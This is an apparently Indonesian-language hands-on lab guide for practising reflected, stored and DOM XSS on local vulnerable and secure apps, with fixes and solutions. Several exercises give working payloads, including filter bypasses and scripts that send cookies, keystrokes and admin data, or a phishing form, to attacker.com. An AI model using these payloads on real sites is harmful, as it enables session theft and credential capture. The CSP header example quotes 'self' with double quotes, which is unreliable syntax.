# XSS Lab Exercises

Hands-on exercises untuk mempraktikkan identifikasi dan pencegahan XSS vulnerabilities.

## 📚 Setup Exercise

### 1. Environment Setup
1. Jalankan lab environment:
   ```bash
   ./setup.sh
   ```
2. Akses kedua aplikasi:
   - Vulnerable: http://localhost:8080
   - Secure: http://localhost:8081

### 2. Tools yang Diperlukan
- Web browser (Chrome/Firefox dengan Developer Tools)
- Text editor
- Browser extension: Web Developer Tools (optional)

---

## 🎯 Exercise 1: Reflected XSS Discovery

### Objective
Temukan dan eksploitasi reflected XSS vulnerability di aplikasi vulnerable.

### Steps
1. Buka http://localhost:8080/reflected.php
2. Test search form dengan input normal: `hello world`
3. Test dengan payload XSS: `<script>alert('XSS')</script>`
4. Observe hasil dan behavior
5. Test dengan payload lain dari PAYLOADS.md

### Questions
1. Bagaimana aplikasi memproses input?
2. Apakah ada filtering atau encoding?
3. Payload mana yang berhasil?
4. Bagaimana cara payload di-execute?

### Expected Results
- [ ] Alert box muncul dengan payload script
- [ ] Payload ditampilkan tanpa sanitasi
- [ ] Input langsung reflected ke output

### Try More Payloads
```html
<img src=x onerror=alert('Reflected XSS')>
<svg onload=alert(document.domain)>
<iframe src="javascript:alert('XSS')"></iframe>
" onmouseover="alert('XSS')
```

---

## 🎯 Exercise 2: Stored XSS Discovery

### Objective
Temukan dan eksploitasi stored XSS vulnerability dalam comment system.

### Steps
1. Buka http://localhost:8080/stored.php
2. Post comment normal untuk test functionality
3. Post comment dengan payload XSS: `<script>alert('Stored XSS!')</script>`
4. Refresh halaman dan observe behavior
5. Test payload yang lebih advanced

### Questions
1. Apakah payload tersimpan di database?
2. Bagaimana payload dieksekusi saat page load?
3. Apakah semua user yang visit page terpengaruh?
4. Payload mana yang paling efektif?

### Expected Results
- [ ] XSS payload tersimpan di database
- [ ] Alert muncul setiap kali halaman dimuat
- [ ] Payload bersifat persistent

### Advanced Payloads to Try
```html
<script>document.body.innerHTML='<h1>HACKED!</h1>'</script>
<img src=x onerror=alert('Cookie: '+document.cookie)>
<svg onload=alert('User Agent: '+navigator.userAgent)>
<script>
new Image().src='http://attacker.com/steal.php?data='+document.cookie;
</script>
```

---

## 🎯 Exercise 3: DOM-based XSS Discovery

### Objective
Temukan DOM XSS melalui manipulasi client-side JavaScript.

### Steps
1. Buka http://localhost:8080/dom.php
2. Test URL fragment: `dom.php#<script>alert('DOM XSS')</script>`
3. Test berbagai input fields dengan payload XSS
4. Analyze JavaScript code untuk understand vulnerability
5. Test payload yang lebih sophisticated

### Questions
1. Bagaimana JavaScript memproses input?
2. Method apa yang digunakan untuk DOM manipulation?
3. Apakah ada server-side involvement?
4. Kenapa payload dieksekusi di client-side?

### Expected Results
- [ ] Fragment-based XSS berhasil
- [ ] Input field XSS berhasil
- [ ] Dynamic content loading vulnerable

### Fragment Payloads
```
dom.php#<img src=x onerror=alert('Fragment XSS')>
dom.php#<svg onload=confirm('DOM XSS confirmed')>
dom.php#<body onload=alert('Body onload XSS')>
```

---

## 🎯 Exercise 4: Context-Specific XSS

### Objective
Test XSS dalam berbagai HTML context dan understand perbedaan encoding requirements.

### Steps
1. Buka http://localhost:8080/contexts.php
2. Test setiap context dengan payload yang sesuai:
   - HTML Context: `<script>alert('HTML')</script>`
   - Attribute Context: `" onmouseover="alert('Attr')"`
   - JavaScript Context: `'; alert('JS'); //`
   - CSS Context: payload CSS injection
   - URL Context: `javascript:alert('URL')`

### Questions
1. Context mana yang paling mudah di-exploit?
2. Payload apa yang berbeda untuk setiap context?
3. Bagaimana cara bypass filter (jika ada)?
4. Impact apa yang bisa dicapai di setiap context?

### Expected Results
- [ ] Berbeda context memerlukan payload berbeda
- [ ] Beberapa context lebih vulnerable dari yang lain
- [ ] Encoding requirements berbeda per context

---

## 🛡️ Exercise 5: Security Analysis

### Objective
Analyze perbedaan implementasi antara vulnerable dan secure application.

### Steps
1. Test payload yang sama di kedua aplikasi
2. Compare source code antara vulnerable dan secure version
3. Identify security controls yang diimplementasi
4. Understand defense mechanisms

### Analysis Points
1. **Input Validation**: Apa perbedaan validasi input?
2. **Output Encoding**: Bagaimana output di-handle?
3. **Security Headers**: Header apa yang ditambahkan?
4. **CSRF Protection**: Apakah ada CSRF protection?

### Comparison Table
| Aspect | Vulnerable App | Secure App |
|--------|----------------|------------|
| Input Validation | None | Server-side validation |
| Output Encoding | None | Context-aware encoding |
| CSRF Protection | None | Token-based |
| Security Headers | None | Full set |
| HTML Sanitization | None | Strip dangerous tags |

---

## 🔧 Exercise 6: Fix the Vulnerabilities

### Objective
Implementasi fix untuk vulnerabilities yang ditemukan.

### Tasks
1. **Fix Reflected XSS**:
   ```php
   // Replace: echo $_GET['input'];
   // With: echo htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
   ```

2. **Fix Stored XSS**:
   ```php
   // Add input validation and output encoding
   $comment = Security::validateInput($_POST['comment'], 'string', 1000);
   echo Security::escapeHtml($comment);
   ```

3. **Fix DOM XSS**:
   ```javascript
   // Replace: element.innerHTML = userInput;
   // With: element.textContent = userInput;
   ```

4. **Add Security Headers**:
   ```php
   header('Content-Security-Policy: default-src "self"');
   header('X-XSS-Protection: 1; mode=block');
   header('X-Content-Type-Options: nosniff');
   ```

---

## 🧪 Exercise 7: Bypass Testing

### Objective
Test apakah fix yang diimplementasi bisa di-bypass.

### Bypass Techniques to Try
1. **Encoding Bypass**:
   ```html
   <script>alert(String.fromCharCode(88,83,83))</script>
   <script>alert('\x58\x53\x53')</script>
   ```

2. **Case Variation**:
   ```html
   <ScRiPt>alert('XSS')</ScRiPt>
   <IMG SRC=x ONERROR=alert('XSS')>
   ```

3. **Alternative Tags**:
   ```html
   <iframe src="javascript:alert('XSS')"></iframe>
   <object data="javascript:alert('XSS')"></object>
   ```

4. **Event Handler Variations**:
   ```html
   <div onmouseover=alert('XSS')>
   <input autofocus onfocus=alert('XSS')>
   ```

### Questions for Each Bypass Attempt
1. Apakah bypass berhasil?
2. Kenapa berhasil atau gagal?
3. Apa yang harus ditambah untuk prevent bypass ini?
4. Defense mechanism mana yang effective?

---

## 📊 Exercise 8: Impact Assessment

### Objective
Understand real-world impact dari XSS vulnerabilities.

### Scenarios to Simulate
1. **Cookie Theft**:
   ```html
   <script>
   new Image().src='http://localhost:3000/steal.php?cookie='+document.cookie;
   </script>
   ```

2. **Session Hijacking**:
   ```html
   <script>
   fetch('/admin/users', {credentials: 'include'})
   .then(response => response.text())
   .then(data => {
     new Image().src='http://attacker.com/exfil.php?data='+btoa(data);
   });
   </script>
   ```

3. **Keylogger**:
   ```html
   <script>
   document.addEventListener('keypress', function(e) {
     new Image().src='http://attacker.com/keylog.php?key='+e.key;
   });
   </script>
   ```

4. **Phishing**:
   ```html
   <script>
   document.body.innerHTML = `
   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
     <h2>Session Expired - Please Login</h2>
     <form action="http://attacker.com/phish.php" method="post">
       <input name="username" placeholder="Username">
       <input type="password" name="password" placeholder="Password">
       <button type="submit">Login</button>
     </form>
   </div>`;
   </script>
   ```

---

## 🎓 Exercise 9: Security Testing Methodology

### Objective
Develop systematic approach untuk XSS testing.

### Testing Checklist
1. **Input Discovery**:
   - [ ] Form fields
   - [ ] URL parameters
   - [ ] HTTP headers
   - [ ] File uploads
   - [ ] WebSocket messages

2. **Context Analysis**:
   - [ ] HTML body context
   - [ ] HTML attribute context  
   - [ ] JavaScript context
   - [ ] CSS context
   - [ ] URL context

3. **Payload Testing**:
   - [ ] Basic payloads
   - [ ] Context-specific payloads
   - [ ] Encoding variations
   - [ ] Bypass techniques

4. **Impact Assessment**:
   - [ ] Data theft potential
   - [ ] Account takeover risk
   - [ ] Defacement possibility
   - [ ] Malware distribution risk

### Documentation Template
```
## XSS Testing Report

**URL:** [Target URL]
**Parameter:** [Vulnerable parameter]
**Context:** [HTML context where payload executes]
**Payload:** [Successful payload]
**Impact:** [Potential impact description]
**Remediation:** [How to fix the vulnerability]
```

---

## 🏆 Exercise 10: Capstone Challenge

### Objective
Comprehensive XSS testing dan remediation project.

### Challenge Tasks
1. **Discovery Phase** (30 points):
   - Find all XSS vulnerabilities in vulnerable app
   - Document each with proof-of-concept
   - Classify by type (Reflected/Stored/DOM)

2. **Exploitation Phase** (40 points):
   - Create functional exploit for each vulnerability
   - Demonstrate real-world impact scenarios
   - Chain multiple vulnerabilities if possible

3. **Remediation Phase** (30 points):
   - Implement fixes for all vulnerabilities
   - Test fixes with bypass attempts
   - Document security improvements

### Deliverables
1. **Vulnerability Report**: Detailed findings
2. **Exploit Code**: Working proof-of-concepts  
3. **Fixed Application**: Secured version
4. **Security Guide**: Prevention best practices

### Success Criteria
- [ ] All XSS types identified and documented
- [ ] Working exploits for each vulnerability
- [ ] Comprehensive fixes implemented
- [ ] Bypass attempts unsuccessful
- [ ] Security best practices documented

---

## 📝 Exercise Solutions

### Exercise 1 Solution: Reflected XSS
**Vulnerable Code**:
```php
echo $_GET['search']; // Direct output without encoding
```

**Working Payloads**:
- `<script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `" onmouseover="alert('XSS')`

**Fix**:
```php
echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
```

### Exercise 2 Solution: Stored XSS
**Vulnerable Code**:
```php
// No sanitization on input
$stmt->execute([$name, $email, $comment]);

// No encoding on output
echo $comment['comment'];
```

**Fix**:
```php
// Input validation
$comment = Security::validateInput($_POST['comment'], 'string', 1000);

// Output encoding
echo Security::escapeHtml($comment['comment']);
```

### Exercise 3 Solution: DOM XSS
**Vulnerable Code**:
```javascript
element.innerHTML = userInput; // Direct DOM manipulation
```

**Fix**:
```javascript
element.textContent = userInput; // Safe DOM manipulation
```

---

## 🎯 Next Steps

After completing these exercises:

1. **Practice on Real Applications**: Use DVWA, WebGoat, atau bWAPP
2. **Learn Advanced Techniques**: WAF bypass, CSP bypass, mutation XSS
3. **Study Security Headers**: Implementation dan configuration
4. **Explore Automation**: XSS scanning tools dan techniques
5. **Contribute to Security**: Bug bounty programs, responsible disclosure

---

## 📚 Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Hunter](https://xsshunter.com/) untuk blind XSS testing
- [BeEF Framework](https://beefproject.com/) untuk post-exploitation

**Good luck with your XSS learning journey! 🚀**